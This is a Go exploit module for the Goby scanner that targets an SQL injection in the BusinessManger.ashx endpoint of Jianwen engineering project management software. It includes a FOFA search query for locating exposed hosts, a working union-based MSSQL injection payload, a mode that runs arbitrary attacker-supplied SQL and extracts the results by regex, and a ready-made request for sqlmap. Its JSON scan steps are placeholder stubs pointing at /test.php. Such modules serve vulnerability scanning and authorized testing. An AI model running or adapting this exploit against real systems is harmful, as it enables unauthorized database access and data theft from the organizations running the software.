package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Jianwen Engineering Project Management Software /AppInterface/Business/BusinessManger SQL Injection Vulnerability",
    "Description": "<p>Engineering project management has always been a complex and delicate process, and every link needs to be precisely controlled. As a product of Chanjet, Haoyecai's Jianwen construction project management software can meet the efficient management needs of construction enterprises for engineering projects. Through the use of this software, enterprises can achieve all-round control of project progress, quality, cost and other aspects. Specifically, Jianwen construction project management software can not only help enterprises optimize the project process and improve work efficiency, but also ensure the smooth progress of the project. With the help of the software, managers can keep abreast of the progress of the project so that they can adjust their strategies in a timely manner.</p>",
    "Product": "Construction-Engineering-Project-MS",
    "Homepage": "https://m.justwin.cn/",
    "DisclosureDate": "2024-10-16",
    "PostTime": "2024-10-16",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"Login/QRLogin.ashx\" && title=\"建文工程\"",
    "GobyQuery": "body=\"Login/QRLogin.ashx\" && title=\"建文工程\"",
    "Level": "1",
    "Impact": "<p>There is an SQL injection vulnerability in the BusinessManger interface, which allows an attacker to access the data in the database without authorization, causing damage to the system.</p>",
    "Recommendation": "<p>1. Reduce the use of or not use string concatenation to execute SQL, and instead pass user input to the SQL execution method as a parameter. </p><p> 2. Verify the value entered by the user.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/134722925"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "建文工程项目管理软件 /AppInterface/Business/BusinessManger SQL 注入漏洞",
            "Product": "建文工程项目管理系统",
            "Description": "<p>工程项目管理向来都是一个复杂而精细的过程，每一个环节都需要精准控制。好业财作为畅捷通公司的产品，其旗下的建文建筑工程项目管理软件恰好能够满足建筑施工企业对工程项目的高效管理需求。通过运用该软件，企业可以实现工程项目进度、质量、成本等方面的全方位把控。具体来说，建文建筑工程项目管理软件不仅能够帮助企业优化项目流程，提高工作效率，还能确保项目的顺利进行。借助该软件，管理人员能够及时了解项目进展状况，以便及时调整策略。<br></p>",
            "Recommendation": "<p>1.减少使用或不使用字符串拼接的方式执行SQL，而是将用户输入当着参数传给执行SQL的方法。<br></p><p>2.对用户输入的值进行校验。<br></p>",
            "Impact": "<p>BusinessManger接口存在SQL注入漏洞，攻击者未经授权可以访问数据库中的数据，对系统造成破坏。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Jianwen Engineering Project Management Software /AppInterface/Business/BusinessManger SQL Injection Vulnerability",
            "Product": "Construction-Engineering-Project-MS",
            "Description": "<p>Engineering project management has always been a complex and delicate process, and every link needs to be precisely controlled. As a product of Chanjet, Haoyecai's Jianwen construction project management software can meet the efficient management needs of construction enterprises for engineering projects. Through the use of this software, enterprises can achieve all-round control of project progress, quality, cost and other aspects. Specifically, Jianwen construction project management software can not only help enterprises optimize the project process and improve work efficiency, but also ensure the smooth progress of the project. With the help of the software, managers can keep abreast of the progress of the project so that they can adjust their strategies in a timely manner.<br></p>",
            "Recommendation": "<p>1. Reduce the use of or not use string concatenation to execute SQL, and instead pass user input to the SQL execution method as a parameter.&nbsp;</p><p>&nbsp;2. Verify the value entered by the user.<br></p>",
            "Impact": "<p>There is an SQL injection vulnerability in the BusinessManger interface, which allows an attacker to access the data in the database without authorization, causing damage to the system.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(url)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = sql
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Connection":   "close",
			"Content-Type": "application/x-www-form-urlencoded",
		}

		urlget := "/AppInterface/Business/BusinessManger.ashx"
		resp, err = setPostRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/AppInterface/Business/BusinessManger"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "e10adc3949ba59abbe56e057f20f883e"
			sql := "method=PrjType&content=%' and 1=2 union select 1,(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')),3,32));-- a"
			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.HostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /AppInterface/Business/BusinessManger.ashx HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n" +
				"Content-Type: application/x-www-form-urlencoded\n" +
				"method=PrjType&content=%' and 1=2 union select 1,(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','233')),3,32));-- a"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `"CodeName":"([^"]*)"`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" || attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				sql = "method=PrjType&content=%' and 1=2 union select 1,(select+" + sql + ");-- a"
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = "数据库信息:\n" + output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
